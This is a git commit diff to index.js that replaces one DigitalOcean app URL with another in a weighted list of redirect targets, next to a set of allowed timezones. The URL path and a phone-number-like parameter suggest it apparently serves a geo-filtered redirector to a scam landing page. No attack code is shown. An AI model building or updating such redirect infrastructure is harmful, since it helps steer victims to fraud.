ff067ec8aabb879e4257f2f131262379801933f7
paalakash <palaksh452@gmail.com>
2026-06-18 08:38:35 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://stingray-app-vsla4.ondigitalocean.app/werrx01USAHTML/?bcda=1800-029-288", weight: 1.0 } 
+    { url: "https://king-prawn-app-2-yp647.ondigitalocean.app/werrx01USAHTML/?bcda=1800-029-288", weight: 1.0 } 
 
 ];
 
